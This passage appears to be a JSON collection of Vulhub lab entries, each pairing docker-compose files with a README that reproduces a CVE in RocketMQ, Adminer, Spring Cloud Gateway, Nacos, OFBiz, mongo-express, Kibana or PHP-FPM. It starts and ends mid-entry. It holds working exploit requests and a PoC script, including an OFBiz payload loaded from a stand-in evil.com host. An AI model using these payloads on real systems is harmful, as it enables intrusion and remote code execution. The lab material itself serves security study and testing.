inside the script to your test target, then modified the version to the corresponding Couchdb version (1 or 2), and successfully get the reverse shell:\n\n![](3.png)\n"
  },
  {
    "filename": "CVE-2023-37582.md",
    "filenamenomd": "CVE-2023-37582",
    "filetext": "# Table of Contents\n- /home/yay/pentest-agent/vulhub/sites_no_md/rocketmq/CVE-2023-37582/docker-compose.yml\n\n## File: /home/yay/pentest-agent/vulhub/sites_no_md/rocketmq/CVE-2023-37582/docker-compose.yml\n\n- Extension: .yml\n- Language: yaml\n- Size: 257 bytes\n- Created: 2025-04-26 21:29:53\n- Modified: 2025-04-26 17:57:04\n\n### Code\n\n```yaml\nservices:\n namesrv:\n   image: vulhub/rocketmq:5.1.0\n   ports:\n     - 9876:9876\n     - 5005:5005\n   command: [\"mqnamesrv\"]\n broker:\n   image: vulhub/rocketmq:5.1.0\n   ports:\n     - 10911:10911\n   command: [\"mqbroker\", \"-n\", \"namesrv:9876\", \"--enable-proxy\"]\n\n```\n\n",
    "readme": "# Apache RocketMQ NameServer Arbitrary File Write (CVE-2023-37582)\n\n[中文版本(Chinese version)](README.zh-cn.md)\n\nApache RocketMQ is a distributed messaging and streaming platform with low latency, high performance and reliability, trillion-level capacity and flexible scalability.\n\nIn RocketMQ versions 5.1.1 and below, there exists an arbitrary file write vulnerability in the NameServer component. The vulnerability exists in the configuration update functionality of RocketMQ's NameServer component. By sending an `UPDATE_NAMESRV_CONFIG` command to the NameServer, an attacker can modify the `configStorePath` configuration item and its content, leading to arbitrary file write.\n\nThis vulnerability arises from an incomplete fix for [CVE-2023-33246](https://github.com/vulhub/vulhub/tree/master/rocketmq/CVE-2023-33246). In addressing CVE-2023-33246, the official team established a blocklist of configuration items that cannot be modified. However, the patch mistakenly designated the blocklist as `configStorePathName`, when it should have been `configStorePath`, leading to this outcome.\n\nReferences:\n\n- <https://github.com/apache/rocketmq/pull/6843>\n- <https://drun1baby.top/2023/11/21/CVE-2023-37582-Apache-RocketMQ-RCE-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/>\n- <https://github.com/Malayke/CVE-2023-37582_EXPLOIT>\n\n## Vulnerable Environment\n\nExecute the following command to start a RocketMQ NameServer 5.1.0:\n\n```shell\ndocker compose up -d\n```\n\nAfter the environment is started, the RocketMQ NameServer will listen on port 9876.\n\n## Exploit\n\nUse this simple [exploit project](https://github.com/vulhub/rocketmq-attack) to reproduce the vulnerability and write arbitrary file.\n\n```shell\nwget https://github.com/vulhub/rocketmq-attack/releases/download/1.1/rocketmq-attack-1.1-SNAPSHOT.jar\njava -jar rocketmq-attack-1.1-SNAPSHOT.jar AttackNamesrv --target your-ip:9876 --path \"/tmp/success\" --content \"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\"\n```\n\nAfter execution, you can verify that the file has been written successfully:\n\n```shell\ncat /tmp/success\n```\n\nThe content \"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\" should be present in the file.\n\n![](1.png)\n"
  },
  {
    "filename": "CVE-2021-21311.md",
    "filenamenomd": "CVE-2021-21311",
    "filetext": "# Table of Contents\n- /home/yay/pentest-agent/vulhub/sites_no_md/adminer/CVE-2021-21311/docker-compose.yml\n\n## File: /home/yay/pentest-agent/vulhub/sites_no_md/adminer/CVE-2021-21311/docker-compose.yml\n\n- Extension: .yml\n- Language: yaml\n- Size: 86 bytes\n- Created: 2025-04-26 21:29:53\n- Modified: 2025-04-26 18:41:15\n\n### Code\n\n```yaml\nversion: '2'\nservices:\n web:\n   image: vulhub/adminer:4.7.8\n   ports:\n    - \"8080:80\"\n\n```\n\n",
    "readme": "# Adminer Server-side Request Forgery on Error Page of Elasticsearch and ClickHouse (CVE-2021-21311)\n\n[中文版本(Chinese version)](README.zh-cn.md)\n\nAdminer is a tool for managing content in databases developed by PHP. It natively supports MySQL, MariaDB, PostgreSQL, SQLite, MS SQL, Oracle, Elasticsearch and MongoDB.\n\nIn adminer from version 4.0.0 and before 4.7.9 there is a server-side request forgery vulnerability on error page of Elasticsearch and ClickHouse. Users of Adminer versions bundling all drivers (e.g. `adminer.php`) are affected. This is fixed in version 4.7.9.\n\nReferences:\n\n- <https://github.com/vrana/adminer/security/advisories/GHSA-x5r2-hj5c-8jx6>\n- <https://github.com/vrana/adminer/files/5957311/Adminer.SSRF.pdf>\n- <https://github.com/projectdiscovery/nuclei-templates/blob/main/http/cves/2021/CVE-2021-21311.yaml>\n\n## Vulnerable environment\n\nExecute following command to start a PHP server with Adminer 4.7.8:\n\n```\ndocker compose up -d\n```\n\nAfter the server is started, you can see the login page of Adminer at `http://your-ip:8080`.\n\n## Exploit\n\nSelect the ElasticSearch as the system field, then input `example.com` into the server field. Click the login button, you will see the 400 response from `example.com`:\n\n![](1.png)\n"
  },
  {
    "filename": "CVE-2022-22947.md",
    "filenamenomd": "CVE-2022-22947",
    "filetext": "# Table of Contents\n- /home/yay/pentest-agent/vulhub/sites_no_md/spring/CVE-2022-22947/docker-compose.yml\n\n## File: /home/yay/pentest-agent/vulhub/sites_no_md/spring/CVE-2022-22947/docker-compose.yml\n\n- Extension: .yml\n- Language: yaml\n- Size: 109 bytes\n- Created: 2025-04-26 21:29:53\n- Modified: 2025-04-26 17:57:04\n\n### Code\n\n```yaml\nservices:\n spring:\n   image: vulhub/spring-cloud-gateway:3.1.0\n   ports:\n    - \"8080:8080\"\n    - \"5005:5005\"\n\n```\n\n",
    "readme": "# Spring Cloud Gateway Actuator API SpEL Code Injection (CVE-2022-22947)\n\n[中文版本(Chinese version)](README.zh-cn.md)\n\nSpring Cloud Gateway provides a library for building an API Gateway on top of Spring WebFlux.\n\nApplications using Spring Cloud Gateway in the version prior to 3.1.0 and 3.0.6, are vulnerable to a code injection attack when the Gateway Actuator endpoint is enabled, exposed and unsecured. A remote attacker could make a maliciously crafted request that could allow arbitrary remote execution on the remote host.\n\nReferences:\n\n- <https://tanzu.vmware.com/security/cve-2022-22947>\n- <https://wya.pl/2022/02/26/cve-2022-22947-spel-casting-and-evil-beans/>\n\n## Vulnerability Environment\n\nExecute the following command to start a server that uses Spring Cloud Gateway 3.1.0:\n\n```\ndocker compose up -d\n```\n\nAfter server is started, browse the `http://your-ip:8080` to see an example page.\n\n## Vulnerability Reproduce\n\nFirstly, send the following request to add a router which contains an evil SpEL expression:\n\n```\nPOST /actuator/gateway/routes/hacktest HTTP/1.1\nHost: localhost:8080\nAccept-Encoding: gzip, deflate\nAccept: */*\nAccept-Language: en\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36\nConnection: close\nContent-Type: application/json\nContent-Length: 329\n\n{\n  \"id\": \"hacktest\",\n  \"filters\": [{\n    \"name\": \"AddResponseHeader\",\n    \"args\": {\n      \"name\": \"Result\",\n      \"value\": \"#{new String(T(org.springframework.util.StreamUtils).copyToByteArray(T(java.lang.Runtime).getRuntime().exec(new String[]{\\\"id\\\"}).getInputStream()))}\"\n    }\n  }],\n  \"uri\": \"http://example.com\"\n}\n```\n\n![](1.png)\n\nSecondly, refresh the gateway. The SpEL expression will be executed in this step:\n\n```\nPOST /actuator/gateway/refresh HTTP/1.1\nHost: localhost:8080\nAccept-Encoding: gzip, deflate\nAccept: */*\nAccept-Language: en\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36\nConnection: close\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 0\n\n\n```\n\n![](2.png)\n\nThirdly, send the following request to retrieve the result:\n\n```\nGET /actuator/gateway/routes/hacktest HTTP/1.1\nHost: localhost:8080\nAccept-Encoding: gzip, deflate\nAccept: */*\nAccept-Language: en\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36\nConnection: close\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 0\n\n\n```\n\n![](3.png)\n\nAfterward, send a DELETE request to remove our evil router:\n\n```\nDELETE /actuator/gateway/routes/hacktest HTTP/1.1\nHost: localhost:8080\nAccept-Encoding: gzip, deflate\nAccept: */*\nAccept-Language: en\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36\nConnection: close\n\n\n```\n\n![](4.png)\n\nFinally, refresh the gateway again:\n\n```\nPOST /actuator/gateway/refresh HTTP/1.1\nHost: localhost:8080\nAccept-Encoding: gzip, deflate\nAccept: */*\nAccept-Language: en\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36\nConnection: close\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 0\n\n\n```\n"
  },
  {
    "filename": "CVE-2021-29441.md",
    "filenamenomd": "CVE-2021-29441",
    "filetext": "# Table of Contents\n- /home/yay/pentest-agent/vulhub/sites_no_md/nacos/CVE-2021-29441/poc.py\n- /home/yay/pentest-agent/vulhub/sites_no_md/nacos/CVE-2021-29441/docker-compose.yml\n- /home/yay/pentest-agent/vulhub/sites_no_md/nacos/CVE-2021-29441/requirements.txt\n- /home/yay/pentest-agent/vulhub/sites_no_md/nacos/CVE-2021-29441/env/mysql.env\n- /home/yay/pentest-agent/vulhub/sites_no_md/nacos/CVE-2021-29441/env/nacos-standlone-mysql.env\n- /home/yay/pentest-agent/vulhub/sites_no_md/nacos/CVE-2021-29441/init.d/nacos.properties\n\n## File: /home/yay/pentest-agent/vulhub/sites_no_md/nacos/CVE-2021-29441/poc.py\n\n- Extension: .py\n- Language: python\n- Size: 1085 bytes\n- Created: 2025-04-26 21:29:53\n- Modified: 2025-04-26 17:57:04\n\n### Code\n\n```python\n#!/usr/bin/env python\n# -*- coding: utf-8 -*-\nimport sys\n\nimport requests\n\nheaders = {\n    \"User-Agent\": \"Nacos-Server\"\n}\n\n\ndef check(target):\n    endpoint = \"/nacos/v1/auth/users?pageNo=1&pageSize=9\"\n    r = requests.get(target.strip(\"/\") + endpoint, headers=headers)\n    if r.status_code == 200 and \"pageItems\" in r.text:\n        print target + \" has vulnerabilities\"\n        return True\n    print target + \"has not vulnerabilities\"\n    return False\n\n\ndef add_user(target):\n    add_user_endpoint = \"/nacos/v1/auth/users?username=vulhub&password=vulhub\"\n\n    r = requests.post(target.strip(\"/\") + add_user_endpoint, headers=headers)\n    if r.status_code == 200 and \"create user ok\" in r.text:\n        print \"Add User Success\"\n        print \"New User Info: vulhub/vulhub\"\n        print \"Nacos Login Endpoint: {}/nacos/\".format(target)\n        exit(1)\n\n    print \"Add User Failed\"\n\n\nif __name__ == '__main__':\n    if len(sys.argv) != 2:\n        print \"Please specify the target: python poc.py http://xxxxx:8848\"\n        exit(-1)\n    if check(sys.argv[1]):\n        add_user(sys.argv[1])\n\n```\n\n## File: /home/yay/pentest-agent/vulhub/sites_no_md/nacos/CVE-2021-29441/docker-compose.yml\n\n- Extension: .yml\n- Language: yaml\n- Size: 598 bytes\n- Created: 2025-04-26 21:29:53\n- Modified: 2025-04-26 17:57:04\n\n### Code\n\n```yaml\nversion: \"2\"\nservices:\n  nacos:\n    image: nacos/nacos-server:1.4.0\n    container_name: nacos-standalone-mysql\n    env_file:\n      - ./env/nacos-standlone-mysql.env\n    volumes:\n      - ./standalone-logs/:/home/nacos/logs\n      - ./init.d/nacos.properties:/home/nacos/init.d/custom.properties\n    ports:\n      - \"8848:8848\"\n      - \"9848:9848\"\n      - \"9555:9555\"\n    depends_on:\n      - mysql\n    restart: on-failure\n  mysql:\n    container_name: mysql\n    image: nacos/nacos-mysql:5.7\n    env_file:\n      - ./env/mysql.env\n    volumes:\n      - ./mysql:/var/lib/mysql\n    ports:\n      - \"3306:3306\"\n```\n\n## File: /home/yay/pentest-agent/vulhub/sites_no_md/nacos/CVE-2021-29441/requirements.txt\n\n- Extension: .txt\n- Language: plaintext\n- Size: 17 bytes\n- Created: 2025-04-26 21:29:53\n- Modified: 2025-04-26 17:57:04\n\n### Code\n\n```plaintext\nrequests==2.26.0\n\n```\n\n## File: /home/yay/pentest-agent/vulhub/sites_no_md/nacos/CVE-2021-29441/env/mysql.env\n\n- Extension: .env\n- Language: unknown\n- Size: 114 bytes\n- Created: 2025-04-26 21:29:53\n- Modified: 2025-04-26 17:57:04\n\n### Code\n\n```unknown\nMYSQL_ROOT_PASSWORD=root\nMYSQL_DATABASE=nacos_devtest\nMYSQL_USER=nacos\nMYSQL_PASSWORD=nacos\nNACOS_AUTH_ENABLE=true\n```\n\n## File: /home/yay/pentest-agent/vulhub/sites_no_md/nacos/CVE-2021-29441/env/nacos-standlone-mysql.env\n\n- Extension: .env\n- Language: unknown\n- Size: 353 bytes\n- Created: 2025-04-26 21:29:53\n- Modified: 2025-04-26 17:57:04\n\n### Code\n\n```unknown\nPREFER_HOST_MODE=hostname\nMODE=standalone\nSPRING_DATASOURCE_PLATFORM=mysql\nMYSQL_SERVICE_HOST=mysql\nMYSQL_SERVICE_DB_NAME=nacos_devtest\nMYSQL_SERVICE_PORT=3306\nMYSQL_SERVICE_USER=nacos\nMYSQL_SERVICE_PASSWORD=nacos\nMYSQL_SERVICE_DB_PARAM=characterEncoding=utf8&connectTimeout=1000&socketTimeout=3000&autoReconnect=true&useSSL=false\nNACOS_AUTH_ENABLE=true\n```\n\n## File: /home/yay/pentest-agent/vulhub/sites_no_md/nacos/CVE-2021-29441/init.d/nacos.properties\n\n- Extension: .properties\n- Language: unknown\n- Size: 722 bytes\n- Created: 2025-04-26 21:29:53\n- Modified: 2025-04-26 17:57:04\n\n### Code\n\n```unknown\n#spring.security.enabled=false\n#management.security=false\n#security.basic.enabled=false\n#nacos.security.ignore.urls=/**\n#management.metrics.export.elastic.host=http://localhost:9200\n# metrics for prometheus\nmanagement.endpoints.web.exposure.include=*\n# metrics for elastic search\n#management.metrics.export.elastic.enabled=false\n#management.metrics.export.elastic.host=http://localhost:9200\n\n# metrics for influx\n#management.metrics.export.influx.enabled=false\n#management.metrics.export.influx.db=springboot\n#management.metrics.export.influx.uri=http://localhost:8086\n#management.metrics.export.influx.auto-create-db=true\n#management.metrics.export.influx.consistency=one\n#management.metrics.export.influx.compressed=true\n```\n\n",
    "readme": "# Nacos Authentication Bypass(CVE-2021-29441)\n\n[中文版本(Chinese version)](README.zh-cn.md)\n\nNacos is a new open source project launched by Alibaba. It is a dynamic service discovery, configuration management and service management platform that makes it easier to build cloud-native applications. Committed to helping discover, configure, and manage microservices. Nacos provides a set of simple and easy-to-use feature sets that can quickly realize dynamic service discovery, service configuration, service metadata and traffic management.\n\nThe vulnerability occurs when nacos will determine whether the requested user-agent is \"Nacos-Server\" when performing authentication and authorization operations, and if it is, it will not perform any authentication. The original intention of the developer is to handle some server-to-server requests. However, because the configuration is too simple, and the negotiated user-agent is set to Nacos-Server, it is directly hard-coded in the code, which leads to the emergence of loopholes. And by using this unauthorized vulnerability, an attacker can obtain sensitive information such as usernames and passwords.\n\nReference links:\n\n- https://github.com/advisories/GHSA-36hp-jr8h-556f\n\n## Vulnerable environments\n\nRunning vulnerability environment：\n\n```shell\ndocker compose up -d\n```\n\nAfter the environment is running, ports 3306, 8848, 9848 and 9555 will be open. In this exploit, we only need to use port 8848, which is the web access port.**When executing the vulnerability verification process, please visit port 8848 first to confirm it is open. In some cases the nacos service will fail to start (caused by the inability to connect to the database), you can restart the nacos service or restart all services**\n\n```shell\ndocker compose restart nacos\n\n```\n\n## Exploit Scripts\n\n```shell\n\npython poc.py http://target:8848\n\n```\n\n![](poc.png)\n\n## Exploit\n\nThe vulnerability exploitation process is as follows.\n\n1. Change the value of User-Agent to Nacos-Server in the request package\n2. Visit http://target:8848/nacos/v1/auth/users?pageNo=1&pageSize=9 to see if the status code is 200 and if the content contains `pageItems`\n3. Visit http://target:8848/nacos/v1/auth/users?username=vulhub&password=vulhub to add a new user using the POST method\n4. Visit http://target:8848/nacos/v1/auth/users?pageNo=1&pageSize=9 for a list of existing users\n5. Visit http://target:8848/nacos/ and log in using the new user added (vulhub/vulhub)\n\n### Detecting the presence of vulnerabilities\n\n![](1.png)\n\nAfter adding the Header header, visit `http://target:8848/nacos/v1/auth/users?pageNo=1&pageSize=9` to see if the return value is 200 and if the content contains `pageItems`.\n\n### Adding a new user\n\n![](2.png)\n\nAfter adding the Header header use **POST** to request `http://target:8848/nacos/v1/auth/users?username=vulhub&password=vulhub` to add a new user with the account and password of vulhub\n\n### Login using the newly created account\n\n![](3.png)\n"
  },
  {
    "filename": "CVE-2024-45507.md",
    "filenamenomd": "CVE-2024-45507",
    "filetext": "# Table of Contents\n- /home/yay/pentest-agent/vulhub/sites_no_md/ofbiz/CVE-2024-45507/docker-compose.yml\n\n## File: /home/yay/pentest-agent/vulhub/sites_no_md/ofbiz/CVE-2024-45507/docker-compose.yml\n\n- Extension: .yml\n- Language: yaml\n- Size: 94 bytes\n- Created: 2025-04-26 21:29:53\n- Modified: 2025-04-26 17:57:04\n\n### Code\n\n```yaml\nservices:\n web:\n   image: vulhub/ofbiz:18.12.15\n   ports:\n    - \"8443:8443\"\n    - \"5005:5005\"\n\n```\n\n",
    "readme": "# Apache OFBiz SSRF and Remote Code Execution (CVE-2024-45507)\n\n[中文版本(Chinese version)](README.zh-cn.md)\n\nApache OFBiz is an open source enterprise resource planning (ERP) system. It provides a suite of enterprise applications that integrate and automate many of the business processes of an enterprise.\n\nThis vulnerability (CVE-2024-45507) affects Apache OFBiz versions prior to 18.12.16. It allows an unauthenticated attacker to perform Server-Side Request Forgery (SSRF) and potentially achieve remote code execution.\n\nReferences:\n\n- <https://github.com/apache/ofbiz-framework/commit/ffb1bc4879>\n- <https://xz.aliyun.com/t/15569>\n- <https://paper.seebug.org/3228/>\n\n## Vulnerable environment\n\nExecute the following command to start an Apache OFBiz 18.12.15 server:\n\n```\ndocker compose up -d\n```\n\nAfter a short wait, you can see the login page at `https://localhost:8443/accounting`.\n\n## Vulnerability Reproduce\n\n### Server-Side Request Forgery (SSRF) attack\n\nSend a POST request to `/webtools/control/forgotPassword/StatsSinceStart` with the following request:\n\n```\nPOST /webtools/control/forgotPassword/StatsSinceStart HTTP/1.1\nHost: localhost:8443\nAccept-Encoding: gzip, deflate, br\nAccept: */*\nAccept-Language: en-US;q=0.9,en;q=0.8\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.6533.100 Safari/537.36\nConnection: close\nCache-Control: max-age=0\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 64\n\nstatsDecoratorLocation=http://10.10.10.10/path/to/api\n```\n\n### Remote Code Execution\n\nCreate a malicious XML file (payload.xml) on a public server like `http://evil.com/ofbiz/payload.xml`:\n\n```xml\n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<screens xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\n        xmlns=\"http://ofbiz.apache.org/Widget-Screen\" xsi:schemaLocation=\"http://ofbiz.apache.org/Widget-Screen http://ofbiz.apache.org/dtds/widget-screen.xsd\">\n\n    <screen name=\"StatsDecorator\">\n        <section>\n            <actions>\n                <set value=\"${groovy:'touch /tmp/success'.execute();}\"/>\n            </actions>\n        </section>\n    </screen>\n</screens>\n```\n\nThen replace your malicious XML url into following request and send:\n\n```\nPOST /webtools/control/forgotPassword/StatsSinceStart HTTP/1.1\nHost: localhost:8443\nAccept-Encoding: gzip, deflate, br\nAccept: */*\nAccept-Language: en-US;q=0.9,en;q=0.8\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.6533.100 Safari/537.36\nConnection: close\nCache-Control: max-age=0\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 64\n\nstatsDecoratorLocation=http://evil.com/ofbiz/payload.xml\n```\n\n![](1.png)\n\nThe command `touch /tmp/success` will be executed on the target server, demonstrating successful exploitation.\n\n![](2.png)\n"
  },
  {
    "filename": "CVE-2019-10758.md",
    "filenamenomd": "CVE-2019-10758",
    "filetext": "# Table of Contents\n- /home/yay/pentest-agent/vulhub/sites_no_md/mongo-express/CVE-2019-10758/docker-compose.yml\n\n## File: /home/yay/pentest-agent/vulhub/sites_no_md/mongo-express/CVE-2019-10758/docker-compose.yml\n\n- Extension: .yml\n- Language: yaml\n- Size: 147 bytes\n- Created: 2025-04-26 21:29:53\n- Modified: 2025-04-26 17:57:04\n\n### Code\n\n```yaml\nservices:\n  web:\n    image: vulhub/mongo-express:0.53.0\n    depends_on:\n      - mongo\n    ports:\n      - \"8081:8081\"\n  mongo:\n    image: mongo:3.4\n\n```\n\n",
    "readme": "# Mongo Express Remote Code Execution (CVE-2019-10758)\n\n[中文版本(Chinese version)](README.zh-cn.md)\n\nmongo-express is a third-party Web interface for MongoDB, developed using Node.js and Express. If an attacker can successfully log in, or if the target server hasn't changed the default credentials (`admin:pass`), they can execute arbitrary Node.js code.\n\n## Environment Setup\n\nExecute the following command to start mongo-express version 0.53.0:\n\n```bash\ndocker compose up -d\n```\n\nAfter the environment starts, visit `http://your-ip:8081` to access the Web interface.\n\n## Vulnerability Reproduction\n\nSend the following HTTP request to execute the code `this.constructor.constructor(\"return process\")().mainModule.require(\"child_process\").execSync(\"touch /tmp/success\")`:\n\n```\nPOST /checkValid HTTP/1.1\nHost: your-ip\nAccept-Encoding: gzip, deflate\nAccept: */*\nAccept-Language: en\nUser-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)\nConnection: close\nAuthorization: Basic YWRtaW46cGFzcw==\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 124\n\ndocument=this.constructor.constructor(\"return process\")().mainModule.require(\"child_process\").execSync(\"touch /tmp/success\")\n```\n\nAs you can see, the `touch /tmp/success` command has been executed successfully:\n\n![](1.png)\n"
  },
  {
    "filename": "CVE-2020-7012.md",
    "filenamenomd": "CVE-2020-7012",
    "filetext": "# Table of Contents\n- /home/yay/pentest-agent/vulhub/sites_no_md/kibana/CVE-2020-7012/docker-compose.yml\n\n## File: /home/yay/pentest-agent/vulhub/sites_no_md/kibana/CVE-2020-7012/docker-compose.yml\n\n- Extension: .yml\n- Language: yaml\n- Size: 226 bytes\n- Created: 2025-04-26 21:29:53\n- Modified: 2025-04-26 17:57:04\n\n### Code\n\n```yaml\nservices:\n  kibana:\n    image: vulhub/kibana:7.6.2\n    depends_on:\n      - elasticsearch\n    ports:\n      - \"5601:5601\"\n  elasticsearch:\n    image: vulhub/elasticsearch:7.6.2\n    environment:\n      - discovery.type=single-node\n```\n\n",
    "readme": "# Kibana 7.6.2 upgrade-assistant-telemetry Prototype Pollution Leads to RCE (CVE-2020-7012)\n\n[中文版本(Chinese version)](README.zh-cn.md)\n\nKibana is an open source data visualization dashboard for Elasticsearch.\n\nKibana versions between 6.7.0 to 6.8.8 and 7.0.0 to 7.6.2 contain a prototype pollution flaw in the Upgrade Assistant. An authenticated attacker with privileges to write to the Kibana index could insert data that would cause Kibana to execute arbitrary code. This could possibly lead to an attacker executing code with the permissions of the Kibana process on the host system.\n\nReferences:\n\n- <https://hackerone.com/reports/852613>\n- <https://discuss.elastic.co/t/elastic-stack-6-8-9-and-7-7-0-security-update/235571>\n\n## Setup\n\nStart Kibana 7.6.2 and Elasticsearch 7.6.2 using Docker:\n\n```bash\ndocker compose up -d\n```\n\nOnce the environment is running, Kibana will be accessible at `http://your-ip:5601`.\n\n## Vulnerability Reproduction\n\nThe remote code execution occurs when Kibana reading the `upgrade-assistant-telemetry` attribute of the saved object from Elasticsearch. So you can exploit this vulnerability by sending data directly to Elasticsearch or submitting queries through Kibana. Execution will occur either after Kibana is restarted or when data collection takes place (at an unknown time).\n\nTo reproduce the vulnerability, first go to the developer tools of the Kibana UI (the URL is `http://your-ip:5601/app/kibana#/dev_tools/console`), then send the following request to modify Kibana mappings to allow the custom `upgrade-assistant-telemetry` document:\n\n```json\nPUT /.kibana_1/_mappings\n{\n  \"properties\": {\n    \"upgrade-assistant-telemetry\": {\n      \"properties\": {\n        \"constructor\": {\n          \"properties\": {\n            \"prototype\": {\n              \"properties\": {\n                \"sourceURL\": {\n                  \"type\": \"text\",\n                  \"fields\": {\n                    \"keyword\": {\n                      \"type\": \"keyword\",\n                      \"ignore_above\": 256\n                    }\n                  }\n                }\n              }\n            }\n          }\n        },\n        \"features\": {\n          \"properties\": {\n            \"deprecation_logging\": {\n              \"properties\": {\n                \"enabled\": {\n                  \"type\": \"boolean\",\n                  \"null_value\": true\n                }\n              }\n            }\n          }\n        },\n        \"ui_open\": {\n          \"properties\": {\n            \"cluster\": {\n              \"type\": \"long\",\n              \"null_value\": 0\n            },\n            \"indices\": {\n              \"type\": \"long\",\n              \"null_value\": 0\n            },\n            \"overview\": {\n              \"type\": \"long\",\n              \"null_value\": 0\n            }\n          }\n        },\n        \"ui_reindex\": {\n          \"properties\": {\n            \"close\": {\n              \"type\": \"long\",\n              \"null_value\": 0\n            },\n            \"open\": {\n              \"type\": \"long\",\n              \"null_value\": 0\n            },\n            \"start\": {\n              \"type\": \"long\",\n              \"null_value\": 0\n            },\n            \"stop\": {\n              \"type\": \"long\",\n              \"null_value\": 0\n            }\n          }\n        }\n      }\n    }\n  }\n}\n```\n\nThen send the second request to inject the malicious telemetry document:\n\n```json\nPUT /.kibana_1/_doc/upgrade-assistant-telemetry:upgrade-assistant-telemetry\n{\n  \"upgrade-assistant-telemetry\": {\n    \"ui_open.overview\": 1,\n    \"ui_open.cluster\": 1,\n    \"ui_open.indices\": 1,\n    \"constructor.prototype.sourceURL\": \"\\u2028\\u2029\\nglobal.process.mainModule.require('child_process').exec('touch /tmp/success')\"\n  },\n  \"type\": \"upgrade-assistant-telemetry\",\n  \"updated_at\": \"2020-04-17T20:47:40.800Z\"\n}\n```\n\n![update kibana mappings](1.png)\n\nFinally, you need to wait for a while for your payload to execute. If you don't want to wait, you can restart the Kibana server by `docker compose restart kibana`, and the malicious code will be executed after the service restarts.\n\nAs you can see, `touch /tmp/success` will be executed after the service restarts:\n\n![index doc status](2.png)\n\n> **Important note: After the exploitation, Kibana will crash and not able to start. You have to delete the `.kibana_1` index from ElasticSearch to restore the functionality.**\n"
  },
  {
    "filename": "CVE-2019-11043.md",
    "filenamenomd": "CVE-2019-11043",
    "filetext": "# Table of Contents\n- /home/yay/pentest-agent/vulhub/sites_no_md/php/CVE-2019-11043/default.conf\n- /home/yay/pentest-agent/vulhub/sites_no_md/php/CVE-2019-11043/docker-compose.yml\n- /home/yay/pentest-agent/vulhub/sites_no_md/php/CVE-2019-11043/www/index.php\n\n## File: /home/yay/pentest-agent/vulhub/sites_no_md/php/CVE-2019-11043/default.conf\n\n- Extension: .conf\n- Language: ini\n- Size: 640 bytes\n- Created: 2025-04-26 21:29:53\n- Modified: 2025-04-26 17:57:04\n\n### Code\n\n```ini\nserver {\n    listen 80 default_server;\n    listen [::]:80 default_server;\n\n    root /usr/share/nginx/html;\n\n    index index.html index.php;\n\n    server_name _;\n\n    location / {\n        try_files $uri $uri/ =404;\n    }\n\n    location ~ [^/]\\.php(/|$) {\n        fastcgi_split_path_info ^(.+?\\.php)(/.*)$;\n        include fastcgi_params;\n\n        fastcgi_param PATH_INFO       $fastcgi_path_info;\n        fastcgi_index index.php;\n        fastcgi_param  REDIRECT_STATUS    200;\n        fastcgi_param  SCRIPT_FILENAME /var/www/html$fastcgi_script_name;\n        fastcgi_param  DOCUMENT_ROOT /var/www/html;\n        fastcgi_pass php:9000;\n    }\n\n}\n\n```\n\n## File: /home/yay/pentest-agent/vulhub/sites_no_md/php/CVE-2019-11043/docker-compose.yml\n\n- Extension: .yml\n- Language: yaml\n- Size: 253 bytes\n- Created: 2025-04-26 21:29:53\n- Modified: 2025-04-26 17:57:04\n\n### Code\n\n```yaml\nservices:\n nginx:\n   image: nginx:1\n   volumes:\n    - ./www:/usr/share/nginx/html\n    - ./default.conf:/etc/nginx/conf.d/default.conf\n   depends_on:\n    - php\n   ports:\n    - \"8080:80\"\n php:\n   image: php:7.2.10-fpm\n   volumes:\n    - ./www:/var/www/html\n```\n\n## File: /home/yay/pentest-agent/vulhub/sites_no_md/php/CVE-2019-11043/www/index.php\n\n- Extension: .php\n- Language: php\n- Size: 25 bytes\n- Created: 2025-04-26 21:29:53\n- Modified: 2025-04-26 17:57:04\n\n### Code\n\n```php\n<?php\necho \"hello world\";\n```\n\n",
    "readme": "# PHP-FPM Remote Code Execution (CVE-2019-11043)\n\n[中文版本(Chinese version)](README.zh-cn.md)\n\nPHP-FPM is a FastCGI implementation for PHP. In PHP versions 7.1.x below 7.1.33, 7.2.x below 7.2.24 and 7.3.x below 7.3.11 in certain configurations of FPM setup it is possible to cause FPM module to write past allocated buffers into the space reserved for FCGI protocol data, thus opening the possibility of remote code execution.\n\nThis vulnerability was first discovered during the Real World CTF 2019 Quals (organized by Chaitin Tech). It affects Nginx servers with certain misconfigurations when working with PHP-FPM, the most common vulnerable configuration includes `location ~ [^/]\\.php(/|$)` rules.\n\n## References\n\n- PHP Bug Report: <https://bugs.php.net/bug.php?id=78599>\n- Technical Analysis: <https://lab.wallarm.com/php-remote-code-execution-0-day-discovered-in-real-world-ctf-exercise/>\n- Exploit Tool: <https://github.com/neex/phuip-fpizdam>\n\n## Environment Setup\n\nStart a vulnerable PHP-FPM 7.2.10 server with Nginx using the following command:\n\n```\ndocker compose up -d\n```\n\nAfter the environment starts, you can access the default page at `http://your-ip:8080/index.php`.\n\n## Vulnerability Reproduction\n\nThe vulnerability can be 